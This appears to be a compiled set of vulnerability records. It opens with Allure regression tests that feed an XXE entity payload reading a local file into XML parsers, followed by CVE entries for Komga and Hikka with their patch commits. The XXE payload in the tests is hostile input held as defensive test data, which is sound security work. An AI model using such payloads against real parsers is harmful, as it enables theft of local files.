+                + "  <!ENTITY xxe SYSTEM \"" + secretFile.toUri() + "\">\n"
+                + "]>\n"
+                + "<TestRun id=\"37bd1bbc-784e-477a-8fe2-a116517ba93f\" name=\"@ip-10-0-12-95 2017-09-11 07:32:55\" xmlns=\"http://microsoft.com/schemas/VisualStudio/TeamTest/2010\">\n"
+                + "    <Times creation=\"2017-09-11T07:32:55.5710479+00:00\" queuing=\"2017-09-11T07:32:55.5710493+00:00\" start=\"2017-09-11T07:31:47.7161493+00:00\" finish=\"2017-09-11T07:50:48.6048416+00:00\" />\n"
+                + "    <TestSettings name=\"default\" id=\"fec1d7e5-efa1-43b5-b261-7507a1de835f\">\n"
+                + "        <Deployment runDeploymentRoot=\"_ip-10-0-12-95 2017-09-11 07_32_55\" />\n"
+                + "    </TestSettings>\n"
+                + "    <Results>\n"
+                + "        <UnitTestResult executionId=\"a0c122ad-b99a-4e42-b42c-9f03a42e789d\" testId=\"6efcec51-ecd8-464a-afdf-a8f254074a1a\" testName=\"MyCompany.TestSuite.IntegrationTests.Retrieve.RetrieveTestCases.Test_BookingIdInResponse_Succeeds\" computerName=\"ip-10-0-12-95\" duration=\"00:00:00.0010000\" startTime=\"2017-09-11T07:32:55.4659624+00:00\" endTime=\"2017-09-11T07:32:55.4659679+00:00\" testType=\"13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b\" outcome=\"Failed\" testListId=\"8c84fa94-04c1-424b-9868-57a2d4851a1d\" relativeResultsDirectory=\"a0c122ad-b99a-4e42-b42c-9f03a42e789d\">\n"
+                + "            <Output>\n"
+                + "                <ErrorInfo>\n"
+                + "                    <Message>&xxe;</Message>\n"
+                + "                    <StackTrace>&xxe;</StackTrace>\n"
+                + "                </ErrorInfo>\n"
+                + "            </Output>\n"
+                + "        </UnitTestResult>\n"
+                + "    </Results>\n"
+                + "    <TestDefinitions>\n"
+                + "        <UnitTest name=\"MyCompany.TestSuite.IntegrationTests.Retrieve.RetrieveTestCases.Test_BookingIdInResponse_Succeeds\" storage=\"/var/lib/jenkins/workspace/Product/code/test/MyCompany.testsuite/bin/release/netcoreapp2.0/MyCompany.testsuite.dll\" id=\"6efcec51-ecd8-464a-afdf-a8f254074a1a\">\n"
+                + "            <Execution id=\"a0c122ad-b99a-4e42-b42c-9f03a42e789d\" />\n"
+                + "            <TestMethod codeBase=\"/var/lib/jenkins/workspace/Product/code/test/MyCompany.TestSuite/bin/Release/netcoreapp2.0/MyCompany.TestSuite.dll\" executorUriOfAdapter=\"executor://xunit/VsTestRunner2\" className=\"MyCompany.TestSuite.IntegrationTests.Retrieve.RetrieveTestCases\" name=\"MyCompany.TestSuite.IntegrationTests.Retrieve.RetrieveTestCases.Test_BookingIdInResponse_Succeeds\" />\n"
+                + "        </UnitTest>\n"
+                + "    </TestDefinitions>\n"
+                + "    <TestEntries>\n"
+                + "        <TestEntry testId=\"6efcec51-ecd8-464a-afdf-a8f254074a1a\" executionId=\"a0c122ad-b99a-4e42-b42c-9f03a42e789d\" testListId=\"8c84fa94-04c1-424b-9868-57a2d4851a1d\" />\n"
+                + "    </TestEntries>\n"
+                + "    <TestLists>\n"
+                + "        <TestList name=\"Results Not in a List\" id=\"8c84fa94-04c1-424b-9868-57a2d4851a1d\" />\n"
+                + "        <TestList name=\"All Loaded Results\" id=\"19431567-8539-422a-85d7-44ee4e166bda\" />\n"
+                + "    </TestLists>\n"
+                + "</TestRun>",
+                StandardCharsets.UTF_8
+        );
+
+        TrxPlugin reader = new TrxPlugin();
+
+        reader.readResults(configuration, visitor, resultsDirectory);
+
+        final ArgumentCaptor<TestResult> captor = ArgumentCaptor.captor();
+        verify(visitor, times(1)).visitTestResult(captor.capture());
+
+        final TestResult testResult = captor.getValue();
+        assertThat(testResult.getStatusMessage()).doesNotContain("John Doe");
+        assertThat(testResult.getStatusTrace()).doesNotContain("Example Org");
+    }
+
     private void process(String... strings) throws IOException {
         Iterator<String> iterator = Arrays.asList(strings).iterator();
         while (iterator.hasNext()) {
diff --git a/plugins/xunit-xml-plugin/src/main/java/io/qameta/allure/xunitxml/XunitXmlPlugin.java b/plugins/xunit-xml-plugin/src/main/java/io/qameta/allure/xunitxml/XunitXmlPlugin.java
index b96d70fbf..8ad1106bc 100644
--- a/plugins/xunit-xml-plugin/src/main/java/io/qameta/allure/xunitxml/XunitXmlPlugin.java
+++ b/plugins/xunit-xml-plugin/src/main/java/io/qameta/allure/xunitxml/XunitXmlPlugin.java
@@ -23,6 +23,7 @@
 import io.qameta.allure.entity.Status;
 import io.qameta.allure.entity.TestResult;
 import io.qameta.allure.entity.Time;
+import io.qameta.allure.parser.ClasspathEntityResolver;
 import io.qameta.allure.parser.XmlElement;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -94,7 +95,9 @@ private void parseAssemblies(final Path parsedFile, final RandomUidContext conte
         try {
             LOGGER.debug("Parsing file {}", parsedFile);
             final DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+            factory.setValidating(false);
             final DocumentBuilder builder = factory.newDocumentBuilder();
+            builder.setEntityResolver(new ClasspathEntityResolver());
             final Document document = builder.parse(parsedFile.toFile());
             final XmlElement assembliesElement = new XmlElement(document.getDocumentElement());
             final String elementName = assembliesElement.getName();
diff --git a/plugins/xunit-xml-plugin/src/test/java/io/qameta/allure/xunitxml/XunitXmlPluginTest.java b/plugins/xunit-xml-plugin/src/test/java/io/qameta/allure/xunitxml/XunitXmlPluginTest.java
index 7f962afbe..d36bf471f 100644
--- a/plugins/xunit-xml-plugin/src/test/java/io/qameta/allure/xunitxml/XunitXmlPluginTest.java
+++ b/plugins/xunit-xml-plugin/src/test/java/io/qameta/allure/xunitxml/XunitXmlPluginTest.java
@@ -34,6 +34,7 @@
 
 import java.io.IOException;
 import java.io.InputStream;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.Arrays;
@@ -185,6 +186,49 @@ void shouldSetStatusDetails(final String resource,
                 );
     }
 
+    @Test
+    void cveEntityReadTest(@TempDir final Path tmp) throws IOException {
+        final Path secretFile = tmp.resolve("secretfile.ini");
+        Files.writeString(secretFile,
+                "[owner]\n"
+                + "name = John Doe\n"
+                + "organization = Example Org.\n",
+                StandardCharsets.UTF_8
+        );
+
+        Files.writeString(
+                resultsDirectory.resolve("bad-test.xml"),
+                "<?xml version=\"1.0\"?>\n"
+                + "<!DOCTYPE foo [\n"
+                + "  <!ENTITY xxe SYSTEM \"" + secretFile.toUri() + "\">\n"
+                + "]>\n"
+                + "<assemblies>\n"
+                + "  <assembly test-framework=\"xunit\">\n"
+                + "    <collection>\n"
+                + "      <test name=\"Exploit Test\" method=\"testMethod\" type=\"TestClass\" result=\"Fail\">\n"
+                + "        <failure>\n"
+                + "          <message>&xxe;</message>\n"
+                + "          <stack-trace>Trace with &xxe;</stack-trace>\n"
+                + "        </failure>\n"
+                + "      </test>\n"
+                + "    </collection>\n"
+                + "  </assembly>\n"
+                + "</assemblies>",
+                StandardCharsets.UTF_8
+        );
+
+        XunitXmlPlugin reader = new XunitXmlPlugin();
+
+        reader.readResults(configuration, visitor, resultsDirectory);
+
+        final ArgumentCaptor<TestResult> captor = ArgumentCaptor.captor();
+        verify(visitor, times(1)).visitTestResult(captor.capture());
+
+        final TestResult testResult = captor.getValue();
+        assertThat(testResult.getStatusMessage()).doesNotContain("John Doe");
+        assertThat(testResult.getStatusTrace()).doesNotContain("Example Org");
+    }
+
     private void process(String... strings) throws IOException {
         Iterator<String> iterator = Arrays.asList(strings).iterator();
         while (iterator.hasNext()) {


================================================================================


CVE ID: CVE-2025-52880
Published: 2025-06-24T20:15:26.373
Modified: 2025-06-26T18:58:14.280
CVSS Score: 4.2 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:N/I:H/A:N

CWE Categories:
  - CWE-799: CWE-799

Description:
Komga is a media server for comics, mangas, BDs, magazines and eBooks. A Cross-Site Scripting (XSS) vulnerability has been discovered in versions 1.8.0 through 1.21.3 when serving EPUB resources, either directly from the API, or when reading using the epub reader. The vulnerability lets an attacker perform actions on the victim's behalf. When targeting an admin user, this can be combined with controlling a server-side command to achieve arbitrary code execution. For this vulnerability to be exploited, a malicious EPUB file has to be present in a Komga library, and subsequently accessed in the Epub reader by an admin user. Version 1.22.0 contains a patch for the issue.

References (2):
  1. https://github.com/gotson/komga/commit/5f9cc449b7846ed2066752c72c9ce7b20c3a85a7
  2. https://github.com/gotson/komga/security/advisories/GHSA-m7mm-6jxp-2m4x

Attempting to extract code examples from references...

--- Code from https://github.com/gotson/komga/commit/5f9cc449b7846ed2066752c72c9ce7b20c3a85a7 ---
From 5f9cc449b7846ed2066752c72c9ce7b20c3a85a7 Mon Sep 17 00:00:00 2001
From: Gauthier Roebroeck <gauthier.roebroeck@gmail.com>
Date: Mon, 23 Jun 2025 11:37:56 +0800
Subject: [PATCH] fix: epub divina heuristic

Closes: #1997
---
 .../komga/domain/service/BookAnalyzer.kt       |  5 ++---
 .../mediacontainer/epub/EpubExtractor.kt       | 18 +++++++++++++++++-
 .../komga/domain/service/BookAnalyzerTest.kt   |  2 +-
 3 files changed, 20 insertions(+), 5 deletions(-)

diff --git a/komga/src/main/kotlin/org/gotson/komga/domain/service/BookAnalyzer.kt b/komga/src/main/kotlin/org/gotson/komga/domain/service/BookAnalyzer.kt
index 60232fbfca..32b6f7bc23 100644
--- a/komga/src/main/kotlin/org/gotson/komga/domain/service/BookAnalyzer.kt
+++ b/komga/src/main/kotlin/org/gotson/komga/domain/service/BookAnalyzer.kt
@@ -147,7 +147,6 @@ class BookAnalyzer(
     book.path.epub { epub ->
       val (resources, missingResources) = epubExtractor.getResources(epub).partition { it.fileSize != null }
       val isFixedLayout = epubExtractor.isFixedLayout(epub)
-      val pageCount = epubExtractor.computePageCount(epub)
       val isKepub = epubExtractor.isKepub(epub, resources)
 
       val errors = mutableListOf<String>()
@@ -181,7 +180,7 @@ class BookAnalyzer(
 
       val divinaPages =
         try {
-          epubExtractor.getDivinaPages(epub, isFixedLayout, pageCount, analyzeDimensions)
+          epubExtractor.getDivinaPages(epub, isFixedLayout, analyzeDimensions)
         } catch (e: Exception) {
           logger.error(e) { "Error while getting EPUB Divina pages" }
           errors.add("ERR_1038")
@@ -213,7 +212,7 @@ class BookAnalyzer(
         status = Media.Status.READY,
         pages = divinaPages,
         files = resources,
-        pageCount = pageCount,
+        pageCount = epubExtractor.computePageCount(epub),
         epubDivinaCompatible = divinaPages.isNotEmpty(),
         epubIsKepub = isKepub,
         extension =
diff --git a/komga/src/main/kotlin/org/gotson/komga/infrastructure/mediacontainer/epub/EpubExtractor.kt b/komga/src/main/kotlin/org/gotson/komga/infrastructure/mediacontainer/epub/EpubExtractor.kt
index cb577a07ae..eac44b105d 100644
--- a/komga/src/main/kotlin/org/gotson/komga/infrastructure/mediacontainer/epub/EpubExtractor.kt
+++ b/komga/src/main/kotlin/org/gotson/komga/infrastructure/mediacontainer/epub/EpubExtractor.kt
@@ -115,7 +115,6 @@ class EpubExtractor(
   fun getDivinaPages(
     epub: EpubPackage,
     isFixedLayout: Boolean,
-    pageCount: Int,
     analyzeDimensions: Boolean,
   ): List<BookPage> {
     if (!isFixedLayout) {
@@ -123,6 +122,19 @@ class EpubExtractor(
       return emptyList()
     }
 
+    val pageCount =
+      run {
+        val spine =
+          epub.opfDoc
+            .select("spine > itemref")
+            .map { it.attr("idref") }
+            .mapNotNull { idref -> epub.manifest[idref]?.href?.let { normalizeHref(epub.opfDir, it) } }
+
+        epub.zip.entries
+          .toList()
+          .count { it.name in spine }
+      }
+
     val pagesWithImages =
       epub.opfDoc
         .select("spine > itemref")
@@ -200,6 +212,10 @@ class EpubExtractor(
     return false
   }
 
+  /**
+   * Computes an approximate page count using the Readium method,
+   * which counts 1 page for every 1024 bytes of compressed data for each resource.
+   */
   fun computePageCount(epub: EpubPackage): Int {
     val spine =
       epub.opfDoc
diff --git a/komga/src/test/kotlin/org/gotson/komga/domain/service/BookAnalyzerTest.kt b/komga/src/test/kotlin/org/gotson/komga/domain/service/BookAnalyzerTest.kt
index 8705dfd2e9..30be3955fb 100644
--- a/komga/src/test/kotlin/org/gotson/komga/domain/service/BookAnalyzerTest.kt
+++ b/komga/src/test/kotlin/org/gotson/komga/domain/service/BookAnalyzerTest.kt
@@ -230,7 +230,7 @@ class BookAnalyzerTest(
       val file = ClassPathResource("epub/The Incomplete Theft - Ralph Burke.epub")
       val book = Book("book", file.url, LocalDateTime.now())
 
-      every { epubExtractor.getDivinaPages(any(), any(), any(), any()) } throws Exception("mock exception")
+      every { epubExtractor.getDivinaPages(any(), any(), any()) } throws Exception("mock exception")
 
       val media = bookAnalyzer.analyze(book, false)
 


================================================================================


CVE ID: CVE-2025-52571
Published: 2025-06-24T20:15:26.213
Modified: 2025-06-26T18:58:14.280
CVSS Score: 9.6 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-287: Improper Authentication

Description:
Hikka is a Telegram userbot. A vulnerability affects all users of versions below 1.6.2, including most of the forks. It allows an unauthenticated attacker to gain access to Telegram account of a victim, as well as full access to the server. The issue is patched in version 1.6.2. No known workarounds are available.

References (2):
  1. https://github.com/hikariatama/Hikka/commit/9a0e4b1b387ef828c345c43d990421d5afcff5f6
  2. https://github.com/hikariatama/Hikka/security/advisories/GHSA-vwpq-wm8w-44wf

Attempting to extract code examples from references...

--- Code from https://github.com/hikariatama/Hikka/commit/9a0e4b1b387ef828c345c43d990421d5afcff5f6 ---
From 9a0e4b1b387ef828c345c43d990421d5afcff5f6 Mon Sep 17 00:00:00 2001
From: hikariatama <elusloodus@mail.ru>
Date: Wed, 1 Mar 2023 15:36:02 +0000
Subject: [PATCH] 1.6.2 - Fix security issue with edited channel messages - Add
 interface to interact with raw pointer data (`.data` attribute) - Translation
 fixes - Randomize `device_model` to bypass fraud detection - Pass proper
 device information to Telegram - Update `hikka-tl` in accordance to upstream
 telethon v1 - Update `hikka-pyro` in accordance to upstream pyrogram - Rename
 packages so that they don't conflict with originals - Partially migrate to
 `pathlib` - Code cleanup

---
 CHANGELOG.md                     |  13 +
 banner.sh                        |  12 +
 hikka/__main__.py                |  19 +-
 hikka/_types.py                  |   2 +-
 hikka/compat/dragon.py           |  12 +-
 hikka/compat/geek.py             |  11 +
 hikka/compat/pyroproxy.py        |  79 ++-
 hikka/configurator.py            |  88 +---
 hikka/database.py                |  24 +-
 hikka/dispatcher.py              |  11 +-
 hikka/inline/bot_pm.py           |  31 +-
 hikka/inline/core.py             |  42 +-
 hikka/inline/events.py           |  20 +-
 hikka/inline/form.py             |  29 +-
 hikka/inline/gallery.py          |  51 +-
 hikka/inline/list.py             |  18 +-
 hikka/inline/token_obtainment.py |  25 +-
 hikka/inline/types.py            |  14 +-
 hikka/inline/utils.py            | 108 +++--
 hikka/loader.py                  | 105 ++--
 hikka/log.py                     |  54 ++-
 hikka/main.py                    | 184 ++++---
 hikka/modules/api_protection.py  |  10 +-
 hikka/modules/eval.py            | 796 +++++++++++++++++++++++++++++++
 hikka/modules/help.py            |  55 ++-
 hikka/modules/hikka_backup.py    |   2 +-
 hikka/modules/hikka_config.py    | 509 +++++++++++---------
 hikka/modules/hikka_info.py      | 253 +++++++---
 hikka/modules/hikka_security.py  | 261 ++++++++--
 hikka/modules/hikka_settings.py  | 219 ++++-----
 hikka/modules/inline_stuff.py    |   6 +-
 hikka/modules/loader.py          |  56 ++-
 hikka/modules/python.py          | 307 ------------
 hikka/modules/settings.py        |  12 +-
 hikka/modules/test.py            |  26 +-
 hikka/modules/translations.py    |   5 +-
 hikka/modules/update_notifier.py |  30 +-
 hikka/modules/updater.py         |  26 +-
 hikka/pointers.py                |  28 +-
 hikka/security.py                |   8 +-
 hikka/tl_cache.py                |  59 ++-
 hikka/translations.py            |   5 +-
 hikka/types.py                   |  55 ++-
 hikka/utils.py                   |  98 ++--
 hikka/version.py                 |   2 +-
 hikka/web/proxypass.py           |   6 +-
 hikka/web/root.py                |  47 +-
 install.sh                       |   2 -
 requirements.txt                 |   2 +-
 termux.sh                        |  63 +++
 web-resources/root.jinja2        |   4 -
 web-resources/static/root.js     |  10 +
 52 files changed, 2556 insertions(+), 1358 deletions(-)
 create mode 100644 banner.sh
 create mode 100644 hikka/modules/eval.py
 delete mode 100755 hikka/modules/python.py
 create mode 100644 termux.sh

diff --git a/CHANGELOG.md b/CHANGELOG.md
index 1c60572e..93fb5c16 100644
--- a/CHANGELOG.md
+++ b/CHANGELOG.md
@@ -1,5 +1,18 @@
 # Hikka Changelog
 
+## 🌑 Hikka 1.6.2
+
+- Fix security issue with edited channel messages
+- Add interface to interact with raw pointer data (`.data` attribute)
+- Translation fixes
+- Randomize `device_model` to bypass fraud detection
+- Pass proper device information to Telegram
+- Update `hikka-tl` in accordance to upstream telethon v1
+- Update `hikka-pyro` in accordance to upstream pyrogram
+- Rename packages so that they don't conflict with originals
+- Partially migrate to `pathlib`
+- Code cleanup
+
 ## 🌑 Hikka 1.6.1
 
 - Remove miyahost from official hosts
diff --git a/banner.sh b/banner.sh
new file mode 100644
index 00000000..51f3220f
--- /dev/null
+++ b/banner.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+
+echo -ne "\\033[2J\033[3;1f"
+printf "
+\033[0;35m _   _ _ _    _         \033[0m
+\033[0;35m| | | (_) | _| | ____ _ \033[0m
+\033[0;35m| |_| | | |/ / |/ / _  |\033[0m
+\033[0;35m|  _  | |   <|   < (_| |\033[0m
+\033[0;35m|_| |_|_|_|\\_\\_|\\_\\__,_|\033[0m
+
+\033[1;32mHikka is running!\033[0m
+"
diff --git a/hikka/__main__.py b/hikka/__main__.py
index 6a175c55..6a47460f 100755
--- a/hikka/__main__.py
+++ b/hikka/__main__.py
@@ -35,16 +35,14 @@
     print("🚫 Error: you cannot run this as a script; you must execute as a package")
 else:
     try:
-        # If telethon is not installed, just skip to a part of main startup
-        # then main.py will through an error and re-install all deps
-        import telethon
+        import hikkatl
     except Exception:
         pass
     else:
         try:
-            import telethon
+            import hikkatl  # noqa: F811
 
-            if tuple(map(int, telethon.__version__.split("."))) < (1, 24, 14):
+            if tuple(map(int, hikkatl.__version__.split("."))) < (2, 0, 0):
                 raise ImportError
         except ImportError:
             print("🔄 Installing Hikka-TL...")
@@ -67,9 +65,9 @@
             restart()
 
         try:
-            import pyrogram
+            import hikkapyro
 
-            if tuple(map(int, pyrogram.__version__.split("."))) < (2, 0, 66):
+            if tuple(map(int, hikkapyro.__version__.split("."))) < (2, 0, 100):
                 raise ImportError
         except ImportError:
             print("🔄 Installing Hikka-Pyro...")
@@ -118,8 +116,7 @@
 
         restart()
 
-    if __name__ == "__main__":
-        if "HIKKA_DO_NOT_RESTART" in os.environ:
-            del os.environ["HIKKA_DO_NOT_RESTART"]
+    if "HIKKA_DO_NOT_RESTART" in os.environ:
+        del os.environ["HIKKA_DO_NOT_RESTART"]
 
-        main.hikka.main()  # Execute main function
+    main.hikka.main()  # Execute main function
diff --git a/hikka/_types.py b/hikka/_types.py
index ecf7552d..e0d0a479 100644
--- a/hikka/_types.py
+++ b/hikka/_types.py
@@ -1,2 +1,2 @@
 # Legacy code support
-from .types import *
+from .types import *  # noqa: F403
diff --git a/hikka/compat/dragon.py b/hikka/compat/dragon.py
index 36981576..2626c828 100644
--- a/hikka/compat/dragon.py
+++ b/hikka/compat/dragon.py
@@ -27,7 +27,7 @@
 else:
     PIP_AVAILABLE = True
 
-from pyrogram import Client, errors, types
+from hikkapyro import Client, errors, types
 
 from .. import version
 from .._internal import restart
@@ -122,8 +122,8 @@ def modname(self):
     def commands(self):
         return {
             key.split()[0]: (
-                ((key.split()[1] + " - ") if len(key.split()) > 1 else "") + value
-            )
+                (key.split()[1] + " - ") if len(key.split()) > 1 else ""
+            ) + value
             for key, value in self.cache[self.modname].items()
         }
 
@@ -386,6 +386,12 @@ def patched_import(name: str, *args, **kwargs):
 
         raise ImportError(f"Unknown module {name}")
 
+    if name.startswith("telethon"):
+        return native_import("hikkatl" + name[8:], *args, **kwargs)
+
+    if name.startswith("pyrogram"):
+        return native_import("hikkapyro" + name[8:], *args, **kwargs)
+
     return native_import(name, *args, **kwargs)
 
 
diff --git a/hikka/compat/geek.py b/hikka/compat/geek.py
index 20051317..8fd986a9 100644
--- a/hikka/compat/geek.py
+++ b/hikka/compat/geek.py
@@ -12,6 +12,17 @@ def compat(code: str) -> str:
     Reformats modules, built for GeekTG to work with Hikka
     :param code: code to reformat
     :return: reformatted code
+    :rtype: str
+    :example:
+    ```python
+        code = '''
+            from ..inline import GeekInlineQuery, rand
+            from ..inline import rand, InlineQueryResultArticle
+            from ..inline import InlineQueryResultArticle, rand
+            from ..inline import rand, InlineQueryResultArticle, InputTextMessageContent
+        '''
+        print(compat(code))
+    ```
     """
     return "\n".join(
         [
diff --git a/hikka/compat/pyroproxy.py b/hikka/compat/pyroproxy.py
index 90ca6fde..ea84ceb2 100644
--- a/hikka/compat/pyroproxy.py
+++ b/hikka/compat/pyroproxy.py
@@ -12,26 +12,26 @@
 import re
 import typing
 
-import telethon
-from pyrogram import Client as PyroClient
-from pyrogram import errors as pyro_errors
-from pyrogram import raw
+import hikkatl
+from hikkapyro import Client as PyroClient
+from hikkapyro import errors as pyro_errors
+from hikkapyro import raw
 
 from .. import translations, utils
 from ..tl_cache import CustomTelegramClient
 from ..version import __version__
 
 PROXY = {
-    pyro_object: telethon.tl.alltlobjects.tlobjects[constructor_id]
+    pyro_object: hikkatl.tl.alltlobjects.tlobjects[constructor_id]
     for constructor_id, pyro_object in raw.all.objects.items()
-    if constructor_id in telethon.tl.alltlobjects.tlobjects
+    if constructor_id in hikkatl.tl.alltlobjects.tlobjects
 }
 
 REVERSED_PROXY = {
     **{tl_object: pyro_object for pyro_object, tl_object in PROXY.items()},
     **{
         tl_object: raw.all.objects[tl_object.CONSTRUCTOR_ID]
-        for _, tl_object in utils.iter_attrs(telethon.tl.custom)
+        for _, tl_object in utils.iter_attrs(hikkatl.tl.custom)
         if getattr(tl_object, "CONSTRUCTOR_ID", None) in raw.all.objects
     },
 }
@@ -47,6 +47,12 @@
 
 
 class PyroProxyClient(PyroClient):
+    """
+    Pyrogram client that redirects all requests to telethon's handler
+    :param tl_client: telethon client
+    :type tl_client: CustomTelegramClient
+    """
+
     def __init__(self, tl_client: CustomTelegramClient):
         self.tl_client = tl_client
         super().__init__(
@@ -72,15 +78,19 @@ def __init__(self, tl_client: CustomTelegramClient):
         self.conn = tl_client.session._conn
 
     async def start(self):
+        """
+        Starts the client
+        :return: None
+        """
         self.me = await self.get_me()
         self.tl_client.raw_updates_processor = self._on_event
 
     def _on_event(
         self,
         event: typing.Union[
-            telethon.tl.types.Updates,
-            telethon.tl.types.UpdatesCombined,
-            telethon.tl.types.UpdateShort,
+            hikkatl.tl.types.Updates,
+            hikkatl.tl.types.UpdatesCombined,
+            hikkatl.tl.types.UpdateShort,
         ],
     ):
         asyncio.ensure_future(self.handle_updates(self._tl2pyro(event)))
@@ -91,6 +101,13 @@ async def invoke(
         *args,
         **kwargs,
     ) -> typing.Union[typing.List[raw.core.TLObject], raw.core.TLObject]:
+        """
+        Invokes a Pyrogram request through telethon
+        :param query: Pyrogram request
+        :return: Pyrogram response
+        :raises RPCError: if Telegram returns an error
+        :rtype: typing.Union[typing.List[raw.core.TLObject], raw.core.TLObject]
+        """
         logger.debug(
             "Running Pyrogram's invoke of %s with Telethon proxying",
             query.__class__.__name__,
@@ -103,14 +120,14 @@ async def invoke(
 
         try:
             r = await self.tl_client(self._pyro2tl(query))
-        except telethon.errors.rpcerrorlist.RPCError as e:
+        except hikkatl.errors.rpcerrorlist.RPCError as e:
             raise self._tl_error2pyro(e)
 
         return self._tl2pyro(r)
 
     @staticmethod
     def _tl_error2pyro(
-        error: telethon.errors.rpcerrorlist.RPCError,
+        error: hikkatl.errors.rpcerrorlist.RPCError,
     ) -> pyro_errors.RPCError:
         rpc = (
             re.sub(r"([A-Z])", r"_\1", error.__class__.__name__)
@@ -130,7 +147,7 @@ def _tl_error2pyro(
             ),
         )()
 
-    def _pyro2tl(self, pyro_obj: raw.core.TLObject) -> telethon.tl.TLObject:
+    def _pyro2tl(self, pyro_obj: raw.core.TLObject) -> hikkatl.tl.TLObject:
         """
         Recursively converts Pyrogram TLObjects to Telethon TLObjects (methods,
         types and everything else, which is in tl schema)
@@ -161,7 +178,7 @@ def _pyro2tl(self, pyro_obj: raw.core.TLObject) -> telethon.tl.TLObject:
             }
         )
 
-    def _tl2pyro(self, tl_obj: telethon.tl.TLObject) -> raw.core.TLObject:
+    def _tl2pyro(self, tl_obj: hikkatl.tl.TLObject) -> raw.core.TLObject:
         """
         Recursively converts Telethon TLObjects to Pyrogram TLObjects (methods,
         types and everything else, which is in tl schema)
@@ -177,7 +194,7 @@ def _tl2pyro(self, tl_obj: telethon.tl.TLObject) -> raw.core.TLObject:
             and hasattr(tl_obj, "sender_id")
         ):
             tl_obj = copy.copy(tl_obj)
-            tl_obj.from_id = telethon.tl.types.PeerUser(tl_obj.sender_id)
+            tl_obj.from_id = hikkatl.tl.types.PeerUser(tl_obj.sender_id)
 
         if isinstance(tl_obj, list):
             return [self._tl2pyro(i) for i in tl_obj]
@@ -188,7 +205,7 @@ def _tl2pyro(self, tl_obj: telethon.tl.TLObject) -> raw.core.TLObject:
         if isinstance(tl_obj, int) and str(tl_obj).startswith("-100"):
             return int(str(tl_obj)[4:])
 
-        if not isinstance(tl_obj, telethon.tl.TLObject):
+        if not isinstance(tl_obj, hikkatl.tl.TLObject):
             return tl_obj
 
         if type(tl_obj) not in REVERSED_PROXY:
@@ -235,7 +252,13 @@ def _convert(self, obj: typing.Any) -> typing.Any:
 
         return obj
 
-    async def resolve_peer(self, *args, **kwargs):
+    async def resolve_peer(self, *args, **kwargs) -> raw.types.Peer:
+        """
+        Resolve a peer (user, chat or channel) from the given input.
+        :param args: Arguments to pass to the Telethon client's
+        :return: The resolved peer
+        :rtype: :obj:`Peer <pyrogram.api.types.Peer>`
+        """
         return self._tl2pyro(await self.tl_client.get_entity(*args, **kwargs))
 
     async def fetch_peers(
@@ -244,22 +267,32 @@ async def fetch_peers(
             typing.Union[raw.types.User, raw.types.Chat, raw.types.Channel]
         ],
     ) -> bool:
+        """
+        Fetches the given peers (users, chats or channels) from the server.
+        :param peers: List of peers to fetch
+        :return: True if the peers were fetched successfully
+        :rtype: bool
+        """
         return any(getattr(peer, "min", False) for peer in peers)
 
     @property
     def iter_chat_members(self):
+        """Alias for :obj:`get_chat_members <pyrogram.Client.get_chat_members>`"""
         return self.get_chat_members
 
     @property
     def iter_dialogs(self):
+        """Alias for :obj:`get_dialogs <pyrogram.Client.get_dialogs>`"""
         return self.get_dialogs
 
     @property
     def iter_history(self):
+        """Alias for :obj:`get_history <pyrogram.Client.get_history>`"""
         return self.get_chat_history
 
     @property
     def iter_profile_photos(self):
+        """Alias for :obj:`get_profile_photos <pyrogram.Client.get_profile_photos>`"""
         return self.get_chat_photos
 
     async def save_file(
@@ -269,7 +302,17 @@ async def save_file(
         file_part: int = 0,
         progress: typing.Callable = None,
         progress_args: tuple = (),
-    ):
+    ) -> raw.types.InputFileLocation:
+        """
+        Save a file to the given path.
+        :param path: The path to save the file to
+        :param file_id: The file ID to save
+        :param file_part: The file part to save
+        :param progress: A callback function to track the progress
+        :param progress_args: Arguments to pass to the progress callback
+        :return: The file location
+        :rtype: :obj:`InputFileLocation <pyrogram.api.types.InputFileLocation>`
+        """
         return self._tl2pyro(
             await self.tl_client.upload_file(
                 path,
diff --git a/hikka/configurator.py b/hikka/configurator.py
index 3ca3d05b..d5d62458 100755
--- a/hikka/configurator.py
+++ b/hikka/configurator.py
@@ -20,80 +20,34 @@
 # You can redistribute it and/or modify it under the terms of the GNU AGPLv3
 # 🔑 https://www.gnu.org/licenses/agpl-3.0.html
 
-import locale
-import os
 import string
-import sys
-import typing
 
-from dialog import Dialog, ExecutableNotFound
 
-from . import utils
-
-
-def _safe_input(*args, **kwargs):
-    """Try to invoke input(*), print an error message if an EOFError or OSError occurs)
-    """
-    try:
-        return input(*args, **kwargs)
-    except (EOFError, OSError):
-        raise
-    except KeyboardInterrupt:
-        print()
-        return None
-
-
-class TDialog:
-    """Reimplementation of dialog.Dialog without external dependencies"""
-
-    def inputbox(self, query: str) -> typing.Tuple[bool, str]:
-        """Get a text input of the query"""
-        print(query)
-        print()
-        inp = _safe_input("Please enter your response, or type nothing to cancel: ")
-        return (False, "Cancelled") if not inp else (True, inp)
-
-    def msgbox(self, msg: str) -> bool:
-        """Print some info"""
-        print(msg)
-        return True
-
-
-TITLE = ""
-
-if sys.stdout.isatty():
-    try:
-        DIALOG = Dialog(dialog="dialog", autowidgetsize=True)
-        locale.setlocale(locale.LC_ALL, "")
-    except (ExecutableNotFound, locale.Error):
-        # Fall back to a terminal based configurator.
-        DIALOG = TDialog()
-else:
-    DIALOG = TDialog()
+def api_config():
+    """Request API config from user and set"""
+    from . import main
 
+    while api_hash := input("\033[0;96mEnter API hash: \033[0m"):
+        if len(api_hash) == 32 and all(
+            symbol in string.hexdigits for symbol in api_hash
+        ):
+            break
 
-def api_config(data_root: str):
-    """Request API config from user and set"""
-    code, hash_value = DIALOG.inputbox("Enter your API Hash")
-    if not code:
-        return
+        print("\033[0;91mInvalid hash\033[0m")
 
-    if len(hash_value) != 32 or any(it not in string.hexdigits for it in hash_value):
-        DIALOG.msgbox("Invalid hash")
-        return
+    if not api_hash:
+        print("\033[0;91mCancelled\033[0m")
+        exit(0)
 
